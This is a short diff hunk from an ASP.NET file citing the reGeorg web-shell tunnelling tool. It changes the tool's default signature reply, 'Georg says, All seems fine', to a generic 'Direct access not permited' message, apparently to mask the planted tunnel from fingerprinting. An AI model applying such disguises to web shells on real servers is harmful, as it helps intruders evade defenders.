@@ -117,7 +117,7 @@ https://github.com/sensepost/reGeorg
                 }
             } 
         } else {
-            Response.Write("Georg says, 'All seems fine'");
+            Response.Write("Direct access not permited");
         }
     }
     catch (Exception exKak)
